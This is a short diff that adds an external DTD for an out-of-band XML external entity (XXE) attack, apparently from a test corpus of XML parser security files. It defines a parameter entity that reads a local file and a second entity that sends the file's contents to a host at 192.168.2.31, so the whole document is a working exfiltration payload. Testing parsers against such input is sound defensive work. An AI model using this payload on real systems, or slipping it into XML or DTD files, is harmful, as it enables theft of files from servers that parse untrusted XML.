@@ -1,0 +1,3 @@
+<!ENTITY % payload SYSTEM "file:///C:/Christopher_Spaeth/code/xml_files_windows/xxe.txt">
+<!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'http://192.168.2.31/?%payload;'>">
+%param1;
